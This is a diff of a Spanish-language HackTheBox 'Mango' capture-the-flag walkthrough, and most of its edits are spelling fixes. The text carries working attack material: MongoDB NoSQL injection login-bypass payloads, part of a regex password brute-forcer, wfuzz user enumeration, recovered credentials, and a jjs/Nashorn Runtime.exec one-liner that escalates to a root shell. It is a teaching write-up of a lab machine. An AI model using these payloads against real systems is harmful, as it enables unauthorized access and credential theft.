@@ -12,7 +12,7 @@ tags:
   - nosqli
 ---
 
-Mango de hackthebox es una maquina que realmente disfrute resolver. Tiene de todo lo que un buen cocktail debe llevar: hielo, mongo nosqli y un chingo de tequila. Iniciamos la maquina por una enumeracion de vhosts, continuamos por un nosqli en mango, obtenemos credenciales, accedemos a la maquina, nos movemos a otro usuario, y para la escalacion de privilegios a root, usamos una herramienta que intectua con el motor de scripts Nashorn.
+Mango de hackthebox es una máquina que realmente disfrute resolver. Tiene de todo lo que un buen cocktail debe llevar: hielo, mongo nosqli y un chingo de tequila. Iniciamos la máquina por una enumeración de vhosts, continuamos por un nosqli en mango, obtenemos credenciales, accedemos a la máquina, nos movemos a otro usuario, y para la escalación de privilegios a root, usamos una herramienta que interactúa con el motor de scripts Nashorn.
 
 <!--more-->
 
@@ -89,7 +89,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Thu Mar 26 15:24:35 2020 -- 1 IP address (1 host up) scanned in 19.04 seconds
 ```
 
-- `-sS` para escaneo TCP vía SYN
+- `-sS` para seleccionar el escaneo TCP vía SYN
 - `-sC` para que ejecute los scripts safe-discovery de nse
 - `-sV` para que me traiga el banner del puerto
 - `-p 22,80,443` para escanear solo los puertos TCP 80 y 22
@@ -103,7 +103,7 @@ Encontramos los servicios de SSH, HTTP, HTTPS en sus puertos por defecto. Por lo
 
 ## httpie
 
-Inicio la exploración de la aplicación usando httpie y firefox+burpsuite. En algunas partes estare utilizando httpie+burpsuite por la flexibilidad de poder usar bash.
+Inicio la exploración de la aplicación usando httpie y firefox+burpsuite. En algunas partes estaré utilizando httpie+burpsuite por la flexibilidad de poder usar bash.
 
 ```
 tony@laptop:~/htb/mango$ http 10.10.10.162
@@ -118,7 +118,7 @@ tony@laptop:~/htb/mango$ http 10.10.10.162
 </body></html>
 ```
 
-En el root del servidor tenemos un *403*, asi que continuemos con la busqueda de archivos y directorios con dirsearch.
+En el root del servidor tenemos un *403*, así que continuemos con la búsqueda de archivos y directorios con dirsearch.
 
 ## dirsearch
 
@@ -140,7 +140,7 @@ Target: http://10.10.10.162
 Task Completed
 ```
 
-El resultado que `dirsearch` nos devuelve sobre el puerto HTTP es poco significativo, asi que continuemos por el puerto de HTTPS, primero indagando en el certificado.
+El resultado que `dirsearch` nos devuelve sobre el puerto HTTP es poco significativo, así que continuemos por el puerto de HTTPS, primero indagando en el certificado.
 
 ## testssl
 
@@ -178,7 +178,7 @@ tony@laptop:~/htb/mango$ testssl 10.10.10.162
  Certificate Transparency     --
 ```
 
-La salida de testssl es bastante extensa, así que omiti información y deje unicamente lo relevante para esta maquina. Lo que sacamos de esta primera parte es que el certificado fue firmado para el dominio staging-order.mango.htb. Esta información coincide con la encontrada en el nmap, pero hasta que no hice la prueba con testssl, no cruce los conceptos de vhosts para esta maquina.
+La salida de testssl es bastante extensa, así que omití información y deje únicamente lo relevante para esta máquina. Lo que sacamos de esta primera parte es que el certificado fue firmado para el dominio staging-order.mango.htb. Esta información coincide con la encontrada en el nmap, pero hasta que no hice la prueba con testssl, no cruce los conceptos de vhosts para esta máquina.
 
 Realizando un request con httpie y usando el header de Host, obtenemos la siguiente salida:
 
@@ -399,9 +399,9 @@ Nice, ahora ya tenemos información sobre un portal para ordenar dulce y jugoso 
 
 Ahora que sabemos que probablemente estaremos trabajando sobre este subdominio, lo primero que hacemos es agregar `10.10.10.162    staging-order.mango.htb` a `/etc/hosts`, de esta manera no tenemos que reescribir el header de Host en todas las peticiones.
 
-Despues de descubrir la aplicación, intente ingresar con credenciales por defecto, inclusive le hice un ataque de fuerza bruta, pero por supuesto, nada funciono. Probé haciendo un bypass con un SQLi y tampoco funciono. Aqui es donde volví a las notas y la metodologia que estaba siguiendo y me di cuenta que necesitaba volver a iniciar el proceso de descubrimiento. Asi que repetimos el proceso de descubrir archivos y directorios con `dirsearch`.
+Después de descubrir la aplicación, intente ingresar con credenciales por defecto, inclusive le hice un ataque de fuerza bruta, pero por supuesto, nada funciono. Probé haciendo un bypass con un SQLi y tampoco funciono. Aquí es donde volví a las notas y la metodología que estaba siguiendo y me dí cuenta que necesitaba volver a iniciar el proceso de descubrimiento. Así que repetimos el proceso de descubrir archivos y directorios con `dirsearch`.
 
-> Siempre hay que enumerar de manera organizada, siguiendo una metodologia.
+> Siempre hay que enumerar de manera organizada, siguiendo una metodología.
 
 ## dirsearch on staging-order
 
@@ -435,7 +435,7 @@ Target: http://staging-order.mango.htb
 [23:54:57] 200 -    3KB - /vendor/composer/LICENSE
 ```
 
-Descubrimos que la aplicación utiliza Composer (PHP) y que podemos leer más de un archivo del proyecto. Veamos que instala composervía **installed.json**:
+Descubrimos que la aplicación utiliza Composer (PHP) y que podemos leer más de un archivo del proyecto. Veamos que instaló composer vía **installed.json**:
 
 ```
 tony@laptop:~/htb/mango$ http http://staging-order.mango.htb/vendor/composer/installed.json
@@ -585,11 +585,11 @@ Server: Apache/2.4.29 (Ubuntu)
 
 ```
 
-Aquí es cuando hice click. Mango-Mongo. La aplicación usa mongodb para la autenticación, por eso mis pruebas iniciales no funcionaron. Asi que lo siguiente que hacemos es ir al payloadAllTheThings y revisar las notas sobre nosqli.
+Aquí es cuando hice click. Mango-Mongo. La aplicación usa mongodb para la autenticación, por eso mis pruebas iniciales no funcionaron. Así que lo siguiente que hacemos es ir al payloadAllTheThings y revisar las notas sobre nosqli.
 
 ## Mongo NoSQLI
 
-Entre las notas, hay una manera interesante de evaluar si la aplicación es suceptible a una injección NOSQLi tipo blind; podemos efectuar una condición true al enviarle un "not equal" con un valor "no valido". Lo que buscamos con esta prueba, es un tipo de respuesta que indique un cambio en el code del response o en la cantidad de caracteres del reponse, asi que tratemos de autenticarnos con el usuario y contraseña "miau":
+Entre las notas, hay una manera interesante de evaluar si la aplicación es susceptible a una inyección NOSQLi tipo blind; podemos efectuar una condición true al enviarle un "not equal" con un valor "no valido". Lo que buscamos con esta prueba, es un tipo de respuesta que indique un cambio en el code del response o en la cantidad de caracteres del reponse, así que tratemos de autenticarnos con el usuario y contraseña "miau":
 
 ```
 tony@laptop:~/htb/mango$ http -f --proxy http:http://127.0.0.1:8080  POST http://staging-order.mango.htb/index.php 'username[$ne]=miau' 'password[$ne]=miau' login=login
@@ -607,15 +607,15 @@ location: home.php
 
 ```
 
-La aplicación no encuentra fallas en mi logica (miau no existe) y con esto nos pasamos por el arco del triunfo su validación. El 302 significa que hemos ingresado a la aplicación, nos da una cookie y nos manda a home.
+La aplicación no encuentra fallas en mi lógica (miau no existe) y con esto nos pasamos por el arco del triunfo su validación. El 302 significa que hemos ingresado a la aplicación, nos da una cookie y nos manda a home.
 
-> Una nota de importancia, el POST con x-www-form-urlencoded fue la parte que me dio dolores de cabeza en la siguiente parte, puesto que iba implicito en el request y fue me hizo perder tiempo ver que no obtenia CODE 302.
+> Una nota de importancia, el POST con x-www-form-urlencoded fue la parte que me dio dolores de cabeza en la siguiente parte, puesto que iba implícito en el request y fue me hizo perder tiempo ver que no obtenía CODE 302.
 
-Al entrar a la aplicación vemos que dentro del body de `home.php`, hay un correo que nos dice sobre la existencia de un usuario admin; `admin@mango.htb`. Asi que ahora vamos por este usuario.
+Al entrar a la aplicación vemos que dentro del body de `home.php`, hay un correo que nos dice sobre la existencia de un usuario admin; `admin@mango.htb`. Así que ahora vamos por este usuario.
 
 ## admin
 
-Dentro de las notas de payloadAllTheThings, hay un script de como realizar un brute force en peticiones POST, que convenientemente modificamos para esta maquina.
+Dentro de las notas de payloadAllTheThings, hay un script de como realizar un brute force en peticiones POST, que convenientemente modificamos para esta máquina.
 
 ```python
 import requests
@@ -639,10 +639,10 @@ while True:
 ```
 
 - Dejamos fijo el valor del usuario, en este caso **admin**.
-- Lo unico que necesitamos es un codigo de respuesta **302** para saber que la peticion fue correcta.
-- Dentro de los headers, necesitamos que nuestra peticion POST tenga x-www-form-urlencoded para que el servidor la acepte.
+- Lo único que necesitamos es un código de respuesta **302** para saber que la petición fue correcta.
+- Dentro de los headers, necesitamos que nuestra petición POST tenga x-www-form-urlencoded para que el servidor la acepte.
 
-Este brute forcer funciona gracias a las expresiones regulares, por que lo que realiza es preguntarle a la aplicación si la contraseña inica con 'X', donde esto es un caracter imprimible y poco a poco, la aplicación le va contestando que "Si" conforme se le vuelve a preguntar (incremental). Cuando analice esto la primera vez, en mi cabeza se puso la imagen de: dia de examen, el alumno pregunton que va y le pregunta al maestro si va bien y mal en 'X' parte. Se levanta una y otra vez a preguntarle al profesor. "Robo hormiga".
+Este brute forcer funciona gracias a las expresiones regulares, por que lo que realiza es preguntarle a la aplicación si la contraseña inicia con 'X', donde esto es un char imprimible y poco a poco, la aplicación le va contestando que "Si" conforme se le vuelve a preguntar (incremental). Cuando analice esto la primera vez, en mi cabeza se puso la imagen de: día de examen, el alumno preguntón que va y le pregunta al maestro si va bien y mal en 'X' parte. Se levanta una y otra vez a preguntarle al profesor. "Robo hormiga".
 
 Al ejecutar el script tenemos lo siguiente:
 
@@ -668,7 +668,7 @@ Found one more char : t9KcS3>!0B#2$$$$$
 Found one more char : t9KcS3>!0B#2$$$$$$
 ```
 
-Continua infinitamente true porque el inicio siempre es valido y porque no sabemos la longitud de la password.
+Continua *true* porque el inicio siempre es valido y porque no sabemos la longitud de la password.
 
 > admin:t9KcS3\>!0B#2
 
@@ -690,13 +690,13 @@ location: home.php
 
 ```
 
-La respuesta es la esperada, asi que podemos ir con burpsuite o firefox, y explorar la aplicación. 
+La respuesta es la esperada, así que podemos ir con burpsuite o firefox, y explorar la aplicación. 
 
-Unos minutos despues, me di cuenta de que no habia nada relevante en esta parte, asi que trate de ingresar por SSH con estas credenciales pero no tuve exito. Asi fue que despues de darle mas vueltas, di un paso atras y decidi buscar mas usuarios.
+Unos minutos después, me dí cuenta de que no había nada relevante en esta parte, así que trate de ingresar por SSH con estas credenciales pero no tuve éxito. Así fue que después de darle mas vueltas, dí un paso atrás y decidí buscar mas usuarios.
 
 ## cewl
 
-Usamos cewl para tomar cualquier valor que nos pueda servir dentro de la aplicación, y con esto, creamos un diccionario con mayusculas y minusculas:
+Usamos cewl para tomar cualquier valor que nos pueda servir dentro de la aplicación, y con esto, creamos un diccionario con mayúsculas y minúsculas:
 
 ```
 tony@laptop:~/htb/mango$ (cewl http://staging-order.mango.htb; cewl http://staging-order.mango.htb | tr '[:upper:]' '[:lower:]' ; cewl http://staging-order.mango.htb | tr '[:lower:]' '[:upper:]')  | grep -vi ninja | tee dict1.txt
@@ -735,7 +735,7 @@ PASSWORD
 LOGIN
 ```
 
-Ahora usando `wfuzz` hacemos bruteforce de todos los posibles usuarios dentro del diccionario. Para la contraseña usamos una condición mayor a 1, aunque tambien hubiera funcionado con un "not equal":
+Ahora usando `wfuzz` hacemos bruteforce de todos los posibles usuarios dentro del diccionario. Para la contraseña usamos una condición mayor a 1, aunque también hubiera funcionado con un "not equal":
 
 ```
 tony@laptop:~/htb/mango$ wfuzz -w dict1.txt --sc 302 -d 'username%5B%24eq%5D=FUZZ&password%5B%24gt%5D=1&login=login' http://staging-order.mango.htb/index.php
@@ -761,7 +761,7 @@ Filtered Requests: 32
 Requests/sec.: 63.44717
 ```
 
-Descubrimos al usuario mango, porque ya saben, "creatividad". Extendi el ataque un poco mas y busque por mas usuarios:
+Descubrimos al usuario mango, porque ya saben, "creatividad". Extendí el ataque con otro diccionario y busque más usuarios:
 
 ```
 tony@laptop:~/htb/mango$ wfuzz -w ~/git/SecLists/Usernames/xato-net-10-million-usernames.txt --sc 302 -d 'username%5B%24eq%5D=FUZZ&password%5B%24gt%5D=1&login=login' http://staging-order.mango.htb/index.php
@@ -785,7 +785,7 @@ ID           Response   Lines    Word     Chars       Payload
 Finishing pending requests...
 ```
 
-Despues de un muchas busquedas, cancele la prueba y continue con lo siguiente, descrubir la contraseña de mango.
+Después de un muchas búsquedas, cancele el bruteforce y continué con lo siguiente, bruteforce a la contraseña de mango.
 
 ## mango at mango.htb
 
@@ -822,7 +822,7 @@ Ahora tenemos otras credenciales mas.
 
 ## ssh as mango
 
-Ahora con estas nuevas credenciales, probe nuevamente el servicio SSH, esta vez, teniendo exito:
+Ahora con estas nuevas credenciales, probé nuevamente el servicio SSH, esta vez, teniendo éxito:
 
 ```
 tony@laptop:~$ ssh mango@10.10.10.162
@@ -856,7 +856,7 @@ mango@mango:~$ id
 uid=1000(mango) gid=1000(mango) groups=1000(mango)
 ```
 
-Al fin, despues de muchas vueltas y ciclos de CPU perdidos para siempre, ingresamos al servidor como _mango_. Checamos los usuarios y vemos a un viejo conocido, __admin__.
+Al fin, después de muchas vueltas y ciclos de CPU perdidos para siempre, ingresamos al servidor como _mango_. Leemos el archivo `/etc/passwd` y vemos a un viejo conocido, __admin__.
 
 ```
 mango@mango:~$ tail /etc/passwd
@@ -874,7 +874,7 @@ mongodb:x:111:65534::/home/mongodb:/usr/sbin/nologin
 
 Luego dije, ¿porque no pude acceder como admin, sera que son otras credenciales? 
 
-Asi que revise SSHd:
+Así que revise el archivo del servicio SSH:
 
 ```
 mango@mango:~$ cat /etc/ssh/sshd_config  | grep -vE '^#|^$'
@@ -889,7 +889,7 @@ PasswordAuthentication yes
 AllowUsers mango root
 ```
 
-Pues con esto me quedo claro que solo mango o root podian acceder. Asi que hice un switch con su:
+Pues con esto me quedo claro que solo mango o root podían acceder. Así que hice un switch con `su - admin`:
 
 ```
 mango@mango:~$ su - admin
@@ -949,11 +949,11 @@ Java.type('java.lang.Runtime')
 Este exec es un tanto rebuscado e interesante, asi que por partes:
 
 - `-p` aparece en todas partes, debido a que esto nos permite que al momento que hagamos nuestra invocación, las variables de root sean pasadas correctamente, como cuando hacemos un `su -` versus un `su`. Esto tiene relación entre el effective user (admin) y el real user (root). 
-- `<$(tty) >$(tty) 2>$(tty)`, aqui basicamente lo que hacemos es conectarnos con la tty sobre la cual estamos trabajando, y redireccionamos tanto lo que sale como lo que entra (STDIN,STDOUT,STDERR). Esto nos servira para que la salida sea la entrada del primer programa que conectamos a un pipe.
+- `<$(tty) >$(tty) 2>$(tty)`, aquí básicamente lo que hacemos es conectarnos con la tty sobre la cual estamos trabajando, y redireccionamos tanto lo que sale como lo que entra (STDIN,STDOUT,STDERR). Esto nos servirá para que la salida sea la entrada del primer programa que conectamos a un pipe.
 - `bash -pc`, se encarga de ejecutar el comando que recibe como argumento.
 - `$@|bash${IFS}-p`, este se encarga de recibir un comando via el array de argumentos y ejecutarlo en bash por que lo recibe por el pipe. La variable ${IFS} es sustituida por un espacio dentro del string para concatenar el argumento `-p`.
 
-Este pequeño script de bash funciona como un pipe que recibe instrucciones via argumentos, es por eso que cuando lo ejecutamos la primera vez, parece un tanto atorado porque no vemos el salto de linea entre instruccion e instrucción.
+Este pequeño script de bash funciona como un pipe que recibe instrucciones vía argumentos, es por eso que cuando lo ejecutamos la primera vez, parece un tanto atorado porque no vemos el salto de linea entre instrucción e instrucción.
 
 ```
 admin@mango:/home/admin$ echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash -pc \$@|bash\${IFS}-p _ echo bash -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
